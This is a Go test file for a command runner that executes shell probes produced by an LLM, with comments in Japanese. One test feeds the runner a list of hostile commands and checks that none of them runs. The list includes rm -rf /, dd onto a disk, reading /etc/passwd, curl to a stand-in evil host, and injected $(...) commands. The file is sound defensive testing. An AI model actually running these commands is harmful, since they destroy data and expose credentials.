package probe

import (
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"testing"

	"github.com/gimenorum/cmdmuse/internal/core"
)

// LLM が出した probe をそのまま実行するため、危険な入力が
// 決して実行に到達しないことを確かめる。
func TestRejectsDangerous(t *testing.T) {
	dangerous := []string{
		"rm -rf /",
		"rm -rf ~",
		"git rev-parse --git-dir; rm -rf /tmp/x",
		"git rev-parse --git-dir && rm -rf .",
		"ls | xargs rm",
		"cat /etc/passwd > /tmp/leak",
		"curl http://evil.example/x.sh",
		"bash -c 'rm -rf /'",
		"sh -c ls",
		"python3 -c 'import os; os.system(\"rm -rf /\")'",
		"node -e 'require(\"fs\").rmSync(\"/\",{recursive:true})'",
		"find . -delete",
		"find . -exec rm {} ;",
		"find . -execdir rm {} +",
		"git config --global user.name hacked",
		"git stash drop",
		"dd if=/dev/zero of=/dev/sda",
		"chmod 777 /etc/shadow",
		"kubectl delete pod x",
		"docker rm -f x",
		"systemctl stop sshd",
		"npm install evil-package",
		"pip install evil",
		"eval ls",
		"$(rm -rf /)",
		"`rm -rf /`",
	}

	r := NewRunner()
	for _, d := range dangerous {
		st, out := r.run(context.Background(), d)
		if st != core.ProbeSkip {
			t.Errorf("危険な probe が実行された: %q -> state=%v out=%q", d, st, out)
		}
	}
}

func TestAllowsSafe(t *testing.T) {
	safe := []string{
		"git rev-parse --git-dir",
		"git branch --list develop",
		"git status --porcelain",
		"git config --get user.name",
		"command -v ls",
		"which ls",
		"test -d /tmp",
		"ls /tmp",
		"find . -name '*.go'",
		"go version",
	}
	r := NewRunner()
	for _, s := range safe {
		st, _ := r.run(context.Background(), s)
		if st == core.ProbeSkip {
			t.Errorf("安全な probe が弾かれた: %q", s)
		}
	}
}

func TestBuiltinLookPath(t *testing.T) {
	r := NewRunner()
	if st, _ := r.run(context.Background(), "command -v sh"); st != core.ProbeOK {
		t.Errorf("command -v sh が OK にならない")
	}
	if st, _ := r.run(context.Background(), "command -v definitely-not-a-real-command-xyz"); st != core.ProbeFail {
		t.Errorf("存在しないコマンドが Fail にならない")
	}
}

func TestTestProbe(t *testing.T) {
	r := NewRunner()
	if st, _ := r.run(context.Background(), "test -d /tmp"); st != core.ProbeOK {
		t.Errorf("test -d /tmp が OK にならない")
	}
	st, out := r.run(context.Background(), "test -f /nonexistent-xyz-123")
	if st != core.ProbeFail {
		t.Errorf("存在しないファイルが Fail にならない")
	}
	// 画面には理由が出るので、空欄では NG の理由が分からない。
	if out == "" {
		t.Errorf("失敗理由が空になっている")
	}
}

func TestTokenize(t *testing.T) {
	got, err := tokenize(`git branch --list "my branch"`)
	if err != nil {
		t.Fatal(err)
	}
	want := []string{"git", "branch", "--list", "my branch"}
	if len(got) != len(want) {
		t.Fatalf("分割数が違う: %v", got)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Errorf("[%d] %q != %q", i, got[i], want[i])
		}
	}
}

// シェルを通さないので glob は自前展開が要る。
// 展開しないと ls *.go が「ファイルがあるのに無い」と誤判定される。
func TestGlobExpansion(t *testing.T) {
	dir := t.TempDir()
	for _, n := range []string{"a.txt", "b.txt"} {
		if err := os.WriteFile(filepath.Join(dir, n), []byte("x"), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	old, _ := os.Getwd()
	if err := os.Chdir(dir); err != nil {
		t.Fatal(err)
	}
	defer os.Chdir(old)

	r := NewRunner()
	if st, out := r.run(context.Background(), "ls *.txt"); st != core.ProbeOK {
		t.Errorf("一致するファイルがあるのに OK にならない: state=%v out=%q", st, out)
	}
	if st, _ := r.run(context.Background(), "ls *.nonexistent"); st != core.ProbeFail {
		t.Errorf("一致しない glob が Fail にならない")
	}
	// find -name のパターンは値なので展開してはいけない。
	if st, out := r.run(context.Background(), "find . -name '*.txt'"); st != core.ProbeOK {
		t.Errorf("find -name のパターンが壊れている: state=%v out=%q", st, out)
	}
}

// git はリポジトリのルートまで親を遡るので、サブディレクトリからでも操作できる。
// test -d .git はカレントしか見ないため、そのまま実行すると正常なリポジトリで
// 全候補を NG にしてしまう。等価な git rev-parse に書き換えて吸収する。
func TestGitDirProbeFromSubdirectory(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git が無い")
	}
	root := t.TempDir()
	if out, err := exec.Command("git", "-C", root, "init", "-q").CombinedOutput(); err != nil {
		t.Skipf("git init 失敗: %s", out)
	}
	sub := filepath.Join(root, "src", "deep")
	if err := os.MkdirAll(sub, 0o755); err != nil {
		t.Fatal(err)
	}
	old, _ := os.Getwd()
	if err := os.Chdir(sub); err != nil {
		t.Fatal(err)
	}
	defer os.Chdir(old)

	r := NewRunner()
	for _, p := range []string{
		"git rev-parse --git-dir",
		"test -d .git",
		"ls -d .git",
		"test -d ./.git",
	} {
		if st, out := r.run(context.Background(), p); st != core.ProbeOK {
			t.Errorf("サブディレクトリで %q が OK にならない: state=%v out=%q", p, st, out)
		}
	}
}

func TestCandidateState(t *testing.T) {
	c := core.Candidate{Preconds: []core.Precond{
		{State: core.ProbeOK}, {State: core.ProbeFail},
	}}
	if c.State() != core.ProbeFail {
		t.Errorf("1つでも失敗したら Fail になるべき")
	}
	empty := core.Candidate{}
	if empty.State() != core.ProbeSkip {
		t.Errorf("前提が無ければ Skip になるべき")
	}
}
